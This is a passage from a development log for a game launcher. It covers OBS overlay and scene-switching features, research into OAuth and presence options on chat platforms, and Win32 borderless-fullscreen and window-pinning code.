stays correct across the page's own 15s meta-refresh reloads for free - a freshly-reloaded page
mid-fade just recomputes the same elapsed value and renders the same faded/not-faded state,
no localStorage or other persisted view-state needed.

New `set_obs_overlay_style(template, mode, alert_seconds)` command - unlike the port, there's no
bind/collision failure mode here (nothing to fail on a plain in-memory struct swap), so it
applies instantly on every control change in `ObsPresenceSettings.vue` rather than needing an
explicit Apply button like the port field has. Style settings persist via the same
`settingsRepo`-then-re-apply-at-boot pattern as the port (`presence.ts`'s `applyPersistedObsPort`
gained a sibling `applyPersistedObsStyle`, both called from `init()`) - Rust still has no DB
access to read either back for itself, `OverlayStyle::default()` is always the boot-time
starting point.

Hit the same `E0716` "temporary value dropped while borrowed" pattern as `obs_presence.rs`'s very
first version (`app.state::<T>().field.lock()` chained directly) - same fix, bind
`app.state::<ObsPresenceState>()` to a local before locking.

### OBS webhook follow-up: real obs-websocket integration (scene auto-switching)

Fourth and last of the original stretch sublist, closing it out. Explicitly flagged from the
start as "worth its own scoping pass" rather than a quick addition - asked the user to pick a
concrete goal before writing anything, since obs-websocket's actual protocol (auth handshake,
persistent WS connection, dozens of possible request types) is a different shape entirely from
`obs_presence.rs`'s passive `tiny_http` server. Options offered: auto-switch scenes on
launch/exit (narrow, 2-3 commands), push-instant overlay updates (smaller real win than it
sounds - the overlay already updates in ~1s via its own client-side timer script), or a full
bidirectional control surface (closest to a mini OBS remote-control plugin, likely its own
milestone number). User picked scene auto-switching.

Added the `obws` crate (`0.15`, default features only - no `builder`/`events`/`tls` needed for
plain request/response scene calls) after confirming via `cargo add --dry-run` it resolves, then
reading the actual downloaded source (`Client::connect`, `Scenes::list`/
`set_current_program_scene`, the `SceneId<'a>` enum's `From<&str>` impl) rather than guessing at
an unfamiliar crate's API - same discipline as checking `tiny_http`'s source earlier this
session before trusting assumptions about its behavior.

New `obs_websocket.rs`: two commands, `obs_ws_list_scenes` (backs a "Fetch Scenes" button in
Settings, doubles as a connectivity test) and `obs_ws_switch_scene`. Both do a fresh
connect-switch-disconnect per call rather than holding any persistent `Client` in managed state -
deliberate: this only fires twice per game session (start/end), so a connection-health/reconnect
lifecycle would be real complexity for a call rate that doesn't need it. Errors follow the same
structured pattern `ObsPresenceError` established (`#[serde(tag = "kind")]`, `ConnectFailed`/
`RequestFailed`, each carrying a `raw` detail string) - `obws::Error` (a `thiserror` enum
covering URI/handshake/timeout/API failures internally) collapses down to just those two kinds,
which is what the Settings UI actually needs to tell apart.

Bundled into the existing `obs-presence` plugin rather than a new plugin entry - both overlay and
scene-switching are "what this game session tells OBS," and the plugin already had its own
settings modal to extend. Scene-switching gets its own independent enable checkbox inside that
modal, so a user can run the overlay without scene-switching or vice versa; the Presence tab's
outer enable checkbox still gates the whole plugin (both features off if disabled there).
`switchObsScene` (index.ts) reads host/port/password/scene settings fresh from `settingsRepo` on
every `activate`/`deactivate` call rather than through any apply-at-boot Rust state (unlike the
port/style, there's no persistent Rust-side state to keep in sync - nothing to re-apply) -
`.catch(() => {})`'d the same way `set_now_playing` already is, so a misconfigured or unreachable
obs-websocket never blocks the overlay's own title/cover update.

Settings UI: host/port/password fields, "Fetch Scenes" populating a `<datalist>` shared by both
scene-name inputs (plain text inputs with `list=`, not `<select>` - resilient to configuring
scenes while OBS/obs-websocket happens to be offline, autocomplete is a convenience layered on
top rather than a hard requirement). New i18n keys (`wsEnabledLabel` through
`wsErrorRequestFailed`) across all 10 locales, same discipline as every other feature this
session.

This closes every item on the original four-item OBS webhook follow-up sublist. The one
remaining unstarted M29 item (detaching presence plugins into the WASM tier) stays separately
flagged as its own not-started stretch item, unrelated to this sublist.

### OBS webhook follow-up: configurable overlay corner

Added ad hoc after the obs-websocket work, following real end-to-end testing of the scene-switch
feature (confirmed working). New `Corner` enum (`TopLeft`/`TopRight`/`BottomLeft`/`BottomRight`)
added to `OverlayStyle`, default `BottomLeft`. `#card` switched from the body's centering flex
layout to `position: fixed` with per-corner `top`/`bottom`/`left`/`right` offsets computed in
Rust (`Corner::css_position`) and injected as an inline style attribute - the idle placeholder
still centers normally, since `position: fixed` removes `#card` from that flex flow entirely
without needing to touch `body`'s own styling.

Right-anchored corners (`TopRight`/`BottomRight`) add a `.info.reverse` class that flips
`.info`'s `flex-direction` to `row-reverse`, so the cover art ends up nearest whichever screen
edge the card itself is anchored to (previously cover was always first/leftmost regardless of
where the card sat, which looked backwards once the card moved to a right-side corner).

`set_obs_overlay_style` gained a fourth `corner` parameter, parsed the same
`"top-left"`/`"top-right"`/`"bottom-left"`/`"bottom-right"` string-match way as `template`/
`mode`. Settings UI: a third `DropdownMenu` alongside Template/Mode, built from a
`Record<string, string>` mapping corner values to i18n keys and `v-for`'d over directly rather
than four hand-written `<button>`s like Template/Mode have (the four corner options don't need
per-item custom logic, so the generic loop stays simpler). New `cornerLabel`/`cornerTopLeft`/
`cornerTopRight`/`cornerBottomLeft`/`cornerBottomRight` i18n keys across all 10 locales.
Persisted/re-applied at boot the same way template/mode/alert-seconds already are
(`applyPersistedObsStyle` in `presence.ts`).

### OBS webhook follow-up: two-line title/elapsed, marquee for overflowing titles

Added ad hoc after noticing title and elapsed time sat side-by-side in one row rather than
stacked. Restructured `.info`'s children from `[cover, title, elapsed]` to `[cover, .text]`,
where `.text` (`flex-direction: column`) holds `.title-wrap`/`.title-inner` and `.elapsed` -
gives the two-line stack for free, and the existing right-corner `.info.reverse` flip still
works unchanged (still just two flex items to reverse: cover and the whole text column).

Marquee: `.title-wrap` gets a fixed `max-width: 16rem; overflow: hidden; white-space: nowrap`;
`.title-inner` is the actual scrolling element inside it. A short script block (added to the
existing `<script>`, runs once on page load, not on the `tick()` interval - title only changes
via the page's own meta-refresh reload anyway, never live via JS) compares
`titleInner.scrollWidth` against `titleWrap.clientWidth` - if it overflows, sets
`--marquee-distance`/`--marquee-duration` CSS custom properties (duration scaled to overflow
amount, `overflow / 30` seconds, floored at 3s so a barely-overflowing title doesn't animate too
fast to read) and adds a `.marquee` class triggering a `@keyframes` bounce (rest at 0, scroll to
`--marquee-distance`, rest, scroll back) rather than a continuous unidirectional loop - a bounce
reads more naturally for a short one-line title than a scrolling ticker does.

Four quick follow-up fixes based on real testing, each superseding a detail above:
1. Bounce replaced with a plain one-direction 0%/100% loop (user found the back-and-forth
   confusing) - snaps back to start each cycle like a standard ticker instead of reversing.
2. The 3s duration floor was removed - it sped up small-overflow titles to hit the floor while
   long ones ran at the real `overflow / 30` rate, an inconsistent px/sec speed depending on
   title length. Marquee now simply doesn't trigger below a 20px overflow threshold instead of
   clamping duration, keeping the remaining ones at a truly constant speed.
3. Travel distance changed from just `overflow` (stopping once the last character was barely
   visible, causing a visible snap mid-title) to `wrapWidth + titleWidth` - starts fully
   off-screen right, ends fully off-screen left, so the loop-back happens while invisible and
   reads as one continuous flow.
4. Root cause of "jumps back to its beginning" (most visible with Steam's longer folder-poll
   detection window leaving a title on screen longer): `<meta http-equiv="refresh" content="15">`
   reloaded the page - and thus restarted the marquee from scratch - unconditionally every 15s,
   even when the title hadn't changed at all. Replaced with a 5s `/status` poll that only calls
   `location.reload()` when the returned title actually differs from what's currently rendered
   (compared against `titleInner.textContent`, `null` when idle) - a real title change still
   correctly resets the marquee (expected, new title should start fresh), but the common case of
   "still playing the same game" no longer disrupts anything.

### Milestone 29 candidate research: Mastodon/Fediverse

Filled in the "not researched yet" placeholder. Structurally different from every other
candidate evaluated so far - the usual "does it need a `client_secret`" question doesn't quite
apply the same way, because there's no single centralized API to register one shared `client_id`
against in the first place.

Mastodon's API requires per-*instance* app registration - each of the thousands of independent
Fediverse servers runs its own copy of the software with its own user base and OAuth
credentials, unlike Discord/Twitch/Slack's one central API a single hardcoded `client_id` can
target forever. `POST /api/v1/apps` is Mastodon's standard mechanism for this: an unauthenticated
endpoint any client can call at runtime to dynamically register itself against whichever
instance the user actually has an account on, returning a `client_id`/`client_secret` pair
scoped to that one instance. This is expected, normal Fediverse client behavior, not a workaround
- every Mastodon app (including the official ones) does this.

The practical effect: Concourse would never embed a static secret in its own source/binary at
all for this integration - each user's `client_secret` is generated fresh, locally, the first
time they connect a given instance, then stored in the local `settings` table the same way other
per-user credentials already are. There's no "protect this shared secret" burden the earlier
IGDB/Chzzk-style candidates raised, since nothing here is shared across Concourse's whole user
base to begin with.

Real open question instead: whether the *token exchange* itself needs that per-instance
`client_secret` at all. Mastodon's OAuth server (Doorkeeper-based) historically required the
classic confidential-client secret exchange; PKCE support for public/native clients is a more
recent addition. Since Fediverse instances run independently and upgrade on their own schedules,
a real implementation can't assume every instance a user might connect to is running a
PKCE-capable version - would need the classic secret-based exchange as a working fallback
regardless, which is fine here (the secret is locally-generated-and-owned per user, not a
sensitive shared value, so sending it during token exchange isn't the same risk class as
IGDB's real API key would be).

This research is from established Mastodon/OAuth protocol knowledge, not verified live against
a real instance - unlike platforms researched via their own current developer docs earlier in
M29 (Twitch, Slack, Bluesky, Chzzk, Kick), no live doc/API check was done here. Worth confirming
against a real instance's current `/api/v1/apps` and `/oauth/token` behavior before committing
to an implementation plan, not just building from this summary alone. Not started.

### Milestone 29 candidate research: SOOP (formerly AfreecaTV)

Live-verified via SOOP's own current API docs (`openapi.sooplive.com/apidoc`, fetched directly),
same rigor as the Twitch/Slack/Bluesky/Chzzk/Kick research earlier in M29.

**Confirmed not viable without per-user credentials or a server-side proxy** - same category as
Chzzk/Kick. Token endpoint is `POST https://openapi.sooplive.com/auth/token`, and the docs state
plainly that `client_secret` is a required parameter alongside `client_id`/`grant_type`/`code`
for the authorization-code exchange - no PKCE, no `code_challenge`/`code_verifier`, no public-
client mechanism anywhere in the documented flow. Standard confidential-client-only OAuth 2.0.

Worse friction than Chzzk on one axis: API access itself is gated behind a manual "Partnership
Application" review (`Support > Partnership Application` in SOOP's developer portal), with SOOP
stating up to 10 business days turnaround before an API key is even issued - this is a
per-*application* gate (i.e. Concourse itself would need to apply and wait), separate from and
in addition to the per-*user* `client_secret` friction every user would still individually hit
even after that. Two layers of friction stacked, not one.

Scopes weren't clearly enumerated in what's publicly documented - moot anyway given the
confidential-client requirement already rules this out on the same grounds as Chzzk/Kick.
Not started, not a strong candidate.

### Milestone 29 candidate research: broader search beyond the already-listed platforms

User asked to look past everything already researched/dropped. Live-checked (WebSearch/WebFetch
against current docs, not trained-knowledge guessing) three new candidates.

**Matrix protocol - the strongest candidate found across all of M29's research.** Two things
distinguish it from every platform researched before it:

1. It has a genuine protocol-level ambient presence concept, not a one-off post - `PUT
   /_matrix/client/v3/presence/{userId}/status` sets both a presence state (online/away/etc.)
   and a free-text `status_msg`, settable and clearable exactly like Discord's Rich Presence
   `set_activity`/`clear_activity`. This is the same shape M29's original scoping call picked
   Discord+OBS to validate the `PresencePlugin` interface against - Matrix would be a third real
   implementation of that exact same shape, not a new one requiring interface changes.
2. Matrix is mid-migration to a new OAuth 2.0/OIDC-based auth system (MSC3861, "next-generation
   auth") using OAuth 2.0 Dynamic Client Registration (RFC 7591) instead of a fixed per-server
   app - same structural benefit Mastodon's `/api/v1/apps` gives (no static secret baked into
   Concourse's source), but going further: as of the current spec status, PKCE is now *required*
   for device-scope binding under the new auth flow, meaning a fully secret-free public-client
   flow is achievable here, not just a fallback-to-secret-when-PKCE-unavailable situation like
   Mastodon's still has.

Real caveat found, not glossed over: this auth system is still actively rolling out across the
Matrix ecosystem (matrix.org's own homeserver only migrated to the new Matrix Authentication
Service in April 2025; as of the most recent "This Week in Matrix" post found, dynamic client
registration is still described as "opt-in" per-homeserver). Since Matrix is federated like
Mastodon, a real implementation can't assume every homeserver a user might connect to has
migrated yet - would need a fallback to the legacy `/_matrix/client/v3/login` password-based
flow for homeservers that haven't, which has no PKCE/secret question at all since it's direct
credential submission (arguably a worse UX/trust ask than either OAuth path, but the simplest to
implement as a fallback). Confirmed via `matrix.org`'s own blog posts and the actual MSC3861/
MSC2966 spec proposal documents on `github.com/matrix-org/matrix-spec-proposals`, not secondary
sources.

**Guilded - researched, weak fit.** A Discord-alternative gaming community platform. Its
documented auth model is a bot-token pattern (generate a token in the app's dashboard, paste it
in) rather than real OAuth with a public/PKCE option - same shape as a Discord bot token, not
comparable to Twitch/Slack's actual OAuth flows. More importantly, nothing found in its API docs
resembling an ambient "now playing" / presence-status field a bot or OAuth'd user could set -
Guilded's API is oriented around bots posting messages/managing servers, not personal status.
Without a presence concept to set, this doesn't fit the category at all regardless of the auth
question.

**ntfy.sh - a genuinely different category, not a social platform.** A simple HTTP pub-sub push-
notification service (`PUT`/`POST` a message to a topic URL, subscribers get a phone/desktop
push). Zero-auth by default - anyone can publish to any topic unless access control is
explicitly configured, no OAuth of any kind needed. This doesn't "notify friends" the way a
social post does (it's closer to a personal alert - you'd subscribe your own phone to a topic
Concourse posts to), so it's a different feature shape than every social-platform candidate
above, closer in spirit to the OBS webhook idea. One real distinction from OBS's webhook,
though: `ntfy.sh` itself (the free public instance most people would default to) is a real third-
party server on the open internet, not something running on the user's own machine - unlike the
"nothing ever leaves the local machine" property that made the OBS webhook the simplest M29
candidate in the first place. Self-hosting ntfy would restore that property; using the public
instance is a deliberate trade of privacy for zero setup. Worth flagging explicitly rather than
assuming it's as clean as the OBS case just because the request itself needs no credentials.

### Milestone 29: Slack parked (audience fit), Twitch's auth model corrected

User decided against building Slack despite it being technically ready - not a viability
question, an audience one: Slack's presence feature is built for "away at lunch"/coworker-status
use, and far fewer people run a gaming-community Slack than a gaming-community Discord. A
correctly-built feature nobody's audience would see isn't worth building first. Parked, not
dropped - the OAuth/PKCE research already done stays valid if this changes later.

Moved to Twitch as the next candidate - and caught a real error in the process. Before sending
the user through Twitch app setup, re-verified live against `dev.twitch.tv`'s current docs
(the original "Twitch - PKCE, safe to hardcode" note in the M29 candidate list predates this
session's live-check discipline and turned out to be wrong). Twitch's Authorization Code grant
requires `client_secret` unconditionally - confidential clients only, no PKCE variant exists for
it at all, unlike Slack/Discord. Public clients (a desktop app with no way to protect a secret,
like Concourse) are restricted to a completely different flow: **Device Code Grant** -
`POST /oauth2/device` returns a short user-facing code and verification URL, the user approves
on Twitch's own site (any device/browser), Concourse polls `/oauth2/token` until approved. Same
UX shape as pairing a smart TV or game console. Still genuinely secret-free and safe to hardcode
a shared `client_id` - just structurally different from the redirect-URI + PKCE pattern
Discord/Slack/OBS's own OAuth-shaped pieces all use, and notably needs no local HTTP listener at
all (simpler infrastructure than Slack's plan would have needed).

Real lesson worth keeping: verify live against current docs before asking the user to do
external setup work, even for platforms already "researched" earlier in the same milestone -
that earlier Twitch note was wrong for an unknown amount of time before this check caught it.
Not started - pending user confirmation on whether the device-code UX pattern is acceptable.

### Milestone 29: platforms closer to Discord specifically (mechanism + audience)

Reframed the search: not "any platform with a status field," but specifically things sharing
Discord's actual shape - a chat/community platform (not broadcast/streaming), genuine gaming-
community audience, ideally the same local-trust auth model (no OAuth network round-trip at
all) that makes Discord's own integration frictionless. Live-checked two.

**TeamSpeak - the closest mechanism match found across all of M29's research, including
Discord's own precedent.** The `ClientQuery` plugin, included and enabled by default in every
TS3 client, exposes a local-only TCP socket (localhost-restricted by default) authenticated with
an API key generated locally on install - the user finds and pastes it in once, same shape as
Discord's local IPC in every way that matters: no OAuth, no redirect flow, no network round trip
to any third party, nothing to hardcode or protect since the key is locally-generated per user.
Supports setting a custom away-message field at runtime - a real, if slightly repurposed, "now
playing" mechanism.

Two honest caveats, not glossed over: the away-message field's actual purpose is signaling AFK
status, not game presence - a user manually going away for a real reason would get silently
overwritten by whatever Concourse last set, a genuine UX collision the Discord/Matrix status
fields don't have (those are dedicated presence concepts, not repurposed). And TeamSpeak's
gaming-community usage has been declining for years as Discord absorbed most of that audience -
real but shrinking reach, the opposite trajectory from every platform researched so far.

**Revolt (now Stoat) - open-source Discord-alternative, auth question left unresolved.**
Correction, caught by the user right after this was first written: the "stoatchat" GitHub org
that showed up in the original search results wasn't a separate unrelated project - Revolt
rebranded to Stoat on October 1st, 2025, after receiving a cease-and-desist over the "Revolt"
name. Same codebase, same API, same maintainers/architecture, GitHub org moved `revoltchat` →
`stoatchat`, now live at `stoat.chat` - not a fork, not a competing project, just a new name.
Confirmed via Stoat's own wiki (`wiki.rvlt.gg`) and contemporary coverage, not assumed from the
GitHub org name alone this time.

Findings below are unaffected by the rename (same underlying platform): `users.edit` supports a
`{ text, presence }` status shape that maps directly onto Discord's own model. But what's
documented and findable is bot-account authentication (a bot token, not real OAuth) - whether a
user's actual personal account (not a separate bot persona) can set its own status this way
isn't confirmed from what's available. Worth flagging as genuinely unresolved rather than
assuming either way - unlike every other platform in this milestone's research, this one wasn't
chased down to a clear yes/no on the exact question that matters (does this represent *you*, or
a bot pretending to be you). Audience is real but small even if the question resolves well -
still a young, niche project relative to Discord or even TeamSpeak.

Neither started. Both added to the candidate list alongside Matrix rather than replacing it -
TeamSpeak's mechanism is the strongest found, but audience trajectory is the opposite of every
other candidate; worth weighing that trade-off explicitly before picking a next build, not
assuming "closest to Discord" automatically means "best choice."

### Milestone 29: Stoat's personal-account status question resolved

Chased down the open question from Stoat's own research entry above - does `users.edit`'s
`{ text, presence }` status work for a real personal account, or only a bot persona pretending
to be the user. `developers.stoat.chat`'s own docs page fetched empty (JS-rendered SPA, no
server-rendered content for WebFetch to read), so used `stoatpy` (a Python API wrapper)'s
readthedocs pages instead, which document the same underlying REST API.

**Resolved: yes, personal accounts genuinely can.** Auth is `login_with_email()` - email/
password producing a session token, same 64-char token format as a bot token but a distinct,
real path for actual personal accounts. Combined with the earlier finding that Stoat's public
API is "powerful enough to be used by the official apps themselves," the official client must
be setting your status through this exact same personal-session path when you change it in the
app UI - not a bot-only capability as first suspected. The "represents the actual user" question
this milestone's own research explicitly flagged as unresolved is now resolved, in the
favorable direction.

New trade-off this surfaces, though: the auth mechanism itself is direct email/password login,
not OAuth. Every other confirmed-fit candidate in this milestone (Discord's local IPC, Matrix's
PKCE flow) either needs no credential at all or a scoped, individually-revocable OAuth token.
Storing a user's actual account password (or the long-lived session token it produces) is a
materially weaker security shape than that - full account access, no scope limiting, no clean
per-app revocation path the way OAuth tokens have. The presence *feature* now checks out; the
*auth story* is the weakest of any confirmed-fit candidate researched so far.

### Milestone 29: three more from a Reddit thread (Fluxer, Nerimity, GameVox)

Couldn't fetch the actual Reddit thread the user pointed at (`reddit.com` refused for WebFetch
across `www.`, the `.json` API path, and `old.reddit.com` - fully blocked in this environment,
not just rate-limited). User pasted the three platform names from a screenshot instead once the
image itself proved too low-res to read reliably.

**Fluxer - not viable today, same shape as Twitch/Chzzk/Kick.** A newer open-source Discord
clone (Erlang/OTP backend, explicitly built "inspired by Discord's architecture"). Live-checked
its own Mintlify docs (`fluxerapp-fluxer.mintlify.app`) - the general OAuth2 flow (`identify`/
`email`/`guilds` scopes) requires `client_secret` in the token exchange, confidential-client
only, no PKCE variant found. More importantly, Fluxer has no Discord-Rich-Presence-style local
mechanism at all yet - confirmed via their own GitHub issue #131 ("Make something like Discord
Rich Presence"), open and unimplemented. Nothing to build against today.

**Nerimity - the most promising new find, parked alongside Matrix/TeamSpeak/Stoat.** Unlike
Fluxer, Nerimity's desktop app genuinely exposes a local RPC WebSocket server for third-party
rich-presence integration - same trust shape as Discord's IPC (local-only, no OAuth, nothing to
hardcode/protect). This isn't speculative: a real community-maintained browser extension
(`Nerimity/nerimity-rpc-extension`) and a Python library (`neripresence` on PyPI) already use
this exact mechanism for sharing Spotify/YouTube activity. Couldn't pin down the precise
port/handshake/message-format details though - `docs.nerimity.com` and the extension's own
README are JS-rendered/incomplete for WebFetch, and the PyPI project page for `neripresence`
also failed to load meaningfully. Confident the mechanism exists and is the right shape;
would need to actually run the Nerimity desktop app and inspect the real protocol (or read
`neripresence`'s source directly via its GitHub repo rather than its PyPI page) before
implementing - noted as a concrete next step if this gets picked up.

**GameVox - no usable developer API found.** A privacy-first voice-chat app (TeamSpeak/Mumble
successor, not a Discord-shaped text+voice platform), currently in open beta. Its own marketing
copy states "no bots and no API setup required" for its core feature (broadcasting to a server) -
read as a deliberate design choice, not just missing docs, consistent with its privacy-first
positioning avoiding third-party integration surface. A "GameVox API v1" hit on Apiary
(`gamevoxapi.docs.apiary.io`) couldn't be confirmed as belonging to this specific platform
(Apiary hosts many abandoned/generic docs under reused names) and returned no usable content
regardless - not treated as evidence either way, just inconclusive. No credible path found.

## Milestone 39 — Borderless Window Pseudo-Fullscreen

Two product decisions confirmed with the user before any code: per-game opt-in (not global -
some games already run real exclusive fullscreen fine), and target whichever display the game's
own window opened on (not always-primary). Both directly shaped the implementation below.

New `pseudo_fullscreen.rs`, added the `windows` crate (`0.62`, Windows-only target dependency,
features: `Win32_Foundation`/`Win32_UI_WindowsAndMessaging`/`Win32_Graphics_Gdi`/
`Win32_System_Threading`/`Win32_System_LibraryLoader`) after confirming exact function
signatures by reading the crate's own generated source directly (same discipline as checking
`tiny_http`/`obws` earlier this session) rather than guessing at an unfamiliar, code-genned
binding crate's API shape.

**Finding the game's window.** `EnumWindows` with a callback matching `GetWindowThreadProcessId`
against the game's known PID (from `child.id()` for direct-exe launches, or the PID
`launcher.rs`'s Phase 1 folder-poll already finds for URI-launched ones - `find_process_under_folder`
is a new PID-returning sibling of the existing bool-returning `any_process_under_folder`, kept
separate rather than changing that function's signature and touching its other caller). Wrapped
in a short retry loop (`wait_for_window`, up to 20 attempts × 250ms) since a game's real
top-level window can take a moment to exist even after its process is confirmed running.

**Resizing, not stretching.** `GetClientRect` at the moment the window is found gives the game's
own content dimensions; `letterbox_rect` contain-fits that aspect ratio within the target
monitor's bounds (`MonitorFromWindow` → `GetMonitorInfoW`), centered. `WS_CAPTION`/
`WS_THICKFRAME` stripped from the window's style (`GetWindowLongPtrW`/`SetWindowLongPtrW`
around `GWL_STYLE`), then `SetWindowPos` moves/resizes to the letterboxed rect with
`SWP_FRAMECHANGED` (forces the style change to actually take visual effect). The game's own
rendered content keeps its real aspect ratio; it just isn't stretched to fill the monitor.

**The letterbox margin itself.** A plain black `WS_POPUP` overlay window covers the full monitor
bounds, `SetWindowPos`'d with `hwndInsertAfter` set to the game's own `HWND` - Win32 places a
window immediately *after* (i.e. visually behind) whatever `HWND` is passed there, so this puts
the overlay directly behind the game window without needing any other z-order gymnastics.
`WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE` keeps it out of the taskbar/alt-tab and stops it from ever
stealing focus.

**Why the overlay needs its own thread.** A Win32 window must be pumped (`GetMessageW`/
`DispatchMessageW`) by the exact OS thread that created it - and the thread available here is
already busy inside `launcher.rs`'s existing `child.wait()`/folder-poll loop tracking the game's
process, which can't also block in a message loop simultaneously. `spawn_overlay` runs the
window's entire lifecycle (class registration, creation, positioning, message loop) on a
dedicated thread, reporting its `HWND` back to the caller over a one-shot channel once created.
Teardown: the tracking thread calls `PostMessageW(overlay_hwnd, WM_CLOSE, ...)` from outside;
`DefWindowProcW`'s default `WM_CLOSE` handling calls `DestroyWindow`, which triggers `WM_DESTROY`,
whose handler in `overlay_wndproc` calls `PostQuitMessage` - that's what makes `GetMessageW`
return `false` and the message-loop thread actually exit. `revert()` joins that thread before
returning, so cleanup is synchronous from the tracking thread's point of view.

**Wiring, deliberately minimal.** No event, no plugin, no store round-trip - `launch_game`/
`track_folder_playtime` each gained a plain `pseudo_fullscreen: bool` parameter (`library.ts`
passes `game.pseudo_fullscreen === 1` straight through), and call `pseudo_fullscreen::apply()`/
`revert()` directly inside their own existing tracking threads, right after the PID is known and
right before their existing `game-session-ended` emit respectively. No extensibility need here
(unlike presence, which genuinely needed multiple swappable implementations) - matches the
"built-in, not a plugin" call made before writing any code.

**HWNDs never cross threads except through the one deliberate channel handoff above** - `HWND`
wraps a raw pointer (`*mut c_void`), not `Send`. Every other use of a game's `HWND` (finding it,
styling it, computing its rect, tearing things down) happens synchronously within whichever
single thread already owns that lifecycle stage, by design - never stored in shared/managed
state, never passed to `tauri::State`.

New `pseudo_fullscreen` column (migration v8) - per-game, defaults off. `GameDetail.vue` gained a
checkbox mirroring `skip_presence`'s existing pattern exactly.

Known limitation, called out rather than silently accepted: the letterbox aspect ratio is
computed from whatever `GetClientRect` reports *at the moment the window is found*, which for
some games may be before they change their own resolution post-launch. No general fix attempted
- would need either polling until the client rect stabilizes across a few checks, or a
game-specific signal this project has no way to observe generically. Left as a documented gap,
not solved this pass.

Verified via `cargo check` (both the Rust module and its `launcher.rs` integration) and
`bun run build` (frontend). Not yet manually tested against a real game - Windows GUI behavior
like this can't be verified from this environment; the user will need to confirm it visually.

### Milestone 39 follow-up: fixed for Steam/URI-launched games specifically

User's first real test confirmed it worked for a direct-exe launch but not a Steam-installed
one. Root cause: `track_folder_playtime`'s window search used `find_process_under_folder`'s
*first* matched PID under the install folder - a fine signal for "is anything running" playtime
detection, but frequently the wrong process for window-finding specifically, since Steam titles
commonly have a launcher stub, anti-cheat helper, or 32-bit bootstrap sharing the same install
folder as the real game exe, none of which own any window at all.

Fixed by changing `pseudo_fullscreen::apply()`'s signature from a fixed `pid: u32` to a
`candidate_pids: impl FnMut() -> Vec<u32>` closure, re-evaluated on every retry tick inside
`wait_for_window` rather than fixed once up front. `launch_game` (direct-exe) passes a trivial
`|| vec![pid]` (still just the one real spawned process, unaffected). `track_folder_playtime`
passes a closure that calls a new `all_processes_under_folder` helper (a sibling of
`find_process_under_folder`, filtering the same way but collecting every match instead of
`.next()`-ing the first) - re-scanning `sysinfo`'s process list fresh each tick, so a real game
process that starts *after* some helper process under the same folder still gets found once it
exists, not just whatever existed at the single moment Phase 1 first detected "something."

Confirmed working after this fix. Manual end-to-end verification (direct-exe launch, then a real
Steam title) both pass.

### Milestone 39 follow-up: window-replacement handling, scoped by research first

User raised two real edge cases against the documented "known limitation" - what if a game's
resolution changes minutes into a session (not caught by a short post-launch stabilization
check), and what if the initial window closes entirely to open a different real game window.
Asked to research how existing tools handle both before building anything, rather than guessing
at scope.

Read the actual source of `andrewmd5/Borderless-Gaming` (a fork of the original `Codeusa`
project, GPL-2.0, the de facto reference tool for this exact feature) directly - both
`Manipulation.cs` (the styling logic) and `Core/ProcessWatcher.cs` (`UpdateProcesses()`).
Findings, not assumed:

- **Late resolution change on an already-styled, still-alive window**: confirmed unsolved even
  there. `MakeWindowBorderless` applies once; no `WM_SIZE` hook, no timer, no re-check. A
  `MadeBorderlessAttempts` counter exists only to avoid retrying a *failed* attempt, not to
  catch a legitimate later resize. This is the accepted, industry-standard limitation - not a
  gap unique to this implementation. Left as-is, documented rather than "solved" with something
  more elaborate than the reference tool itself attempts.
- **Window replaced (launcher closes, real game window opens)**: this one they *do* handle,
  via periodic re-scanning rather than tracking one window's identity - `ProcessWatcher.
  UpdateProcesses()` runs on a timer, prunes any tracked window that closed or changed title
  (cleaning up its borderless state), and separately detects brand-new matching windows as fresh
  entries.

Recalibrated the fix to match that scope exactly, rather than the originally-proposed full
continuous resize-tracking monitor (which would have been *more* than the reference tool itself
attempts - not a fix to actually apply). `apply()`'s styling logic split out into
`apply_to_hwnd(hwnd)`; new `refresh(state, candidate_pids)` checks whether the tracked `HWND` is
still valid (`IsWindow`) and, only if not, tears down the orphaned overlay and re-searches
`candidate_pids` for whatever window exists now, applying fresh styling to it. Deliberately a
single lookup attempt per call (not `apply()`'s multi-second first-launch retry), since it's
already being called repeatedly.

Wired into both tracking threads' *existing* poll ticks rather than a new timer -
`track_folder_playtime`'s Phase 2 loop already runs every 3s, so `refresh()` just piggybacks on
that. `launch_game` didn't have an equivalent tick (it used a single blocking `child.wait()`) -
changed to poll via `child.try_wait()` in a 3s loop instead, but only when `pseudo_fullscreen`
is actually enabled for that launch, preserving the simpler blocking-wait behavior (no added
CPU/wakeup overhead) for the common case where it isn't.

License note, since research meant reading a GPL-2.0 project's source directly: no impact on
Concourse's own MIT license. Nothing was copied - only the *behavior* was read and understood,
then reimplemented independently in Rust against a completely different API (`windows` crate vs.
.NET P/Invoke). GPL's copyleft applies to copying/deriving code, not to reading public source for
research and writing an unrelated independent implementation.

### Milestone 39 stretch: always-on-top pinning

First of the three speculative window-behavior stretch items - the user picked it explicitly
after a trade-off comparison of all three (always-on-top: smallest, self-contained; remembered
position: needs off-screen-rect clamping; forced resolution/DPI: two genuinely different
mechanisms, whole-desktop side effects, the riskiest by far).

New `always_on_top.rs`, deliberately thin - `SetWindowPos` with `HWND_TOPMOST`/`HWND_NOTOPMOST`
is the entire mechanism, no overlay, no letterbox math. Reuses `pseudo_fullscreen.rs`'s window-
finding (`find_window_for_pid`/`wait_for_window`, both changed from private to `pub(crate)`)
rather than duplicating the `EnumWindows` callback - that's the trickiest unsafe code in the
whole feature, not worth a second copy. Keeps its own independent `AlwaysOnTopState`/`apply`/
`revert`/`refresh` rather than folding into `PseudoFullscreenState`, since the two treatments
are independently toggleable per game (either, neither, or both).

Same window-replacement handling as pseudo-fullscreen (`refresh()`, piggybacked on each tracking
thread's existing poll tick rather than a new timer) - `launch_game`/`track_folder_playtime` in
`launcher.rs` now carry both `pseudo_fullscreen` and `always_on_top` bool params side by side,
applying/refreshing/reverting each independently within the same loop iteration. New
`always_on_top` column (migration v9), `GameDetail.vue` checkbox mirroring the existing pattern
exactly.

### Milestone 39 stretch: remembered window position/size

Second of the three window-behavior stretch items. Same reused-window-finding shape as
`always_on_top.rs`, but with a real extra wrinkle the other two didn't have: this feature needs
to *write* data back (the captured rect), and this codebase's Rust side has no DB access at all
(`tauri-plugin-sql` is JS-only here - the same fact that shaped `presence.ts`'s
`applyPersistedObsPort`/`applyPersistedObsStyle` design earlier this session). So the captured
rect can't be persisted from inside `remembered_window.rs` or `launcher.rs` directly - it rides
back through `GameSessionEnded`'s event payload instead (four new optional fields), and
`library.ts`'s existing `game-session-ended` listener (already the place that records playtime)
